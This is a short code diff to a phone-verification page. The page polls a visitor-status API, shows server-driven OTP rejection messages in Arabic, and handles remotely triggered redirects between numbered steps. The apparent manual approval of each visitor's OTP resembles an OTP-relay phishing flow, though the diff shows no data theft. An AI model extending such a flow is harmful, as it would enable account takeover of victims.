@@ -69,12 +69,6 @@ export default function VerifyPhonePage() {
         if (!res.ok) return
         const data = await res.json()
         
-        // Check for redirect page
-        const redirectPage = data.redirectPage || data.redirect_page
-        if (redirectPage === 'step4' && window.location.pathname !== '/step4') {
-          window.location.href = '/step4'
-        }
-        
         // Check for resend request - show OTP dialog with message
         if (data.phoneResendRequested) {
           setOtpRejectionError("رمز التحقق غير صحيح أو منتهي الصلاحية - يرجى انتظار رمز جديد")
@@ -92,9 +86,9 @@ export default function VerifyPhonePage() {
           alert(data.phoneRejectionMessage)
         }
         
-        // Check phone OTP status - approved
-        if (data.phoneOtpStatus === 'approved' && window.location.pathname !== '/step4') {
-          window.location.href = '/step4'
+        // Clear oneTimeRedirect after it was used by useRedirectMonitor
+        if (data.oneTimeRedirect) {
+          fetch(`/api/visitors/${visitorId}/clear-redirect`, { method: 'POST' }).catch(() => {})
         }
       } catch (err) {
         // Silent fail
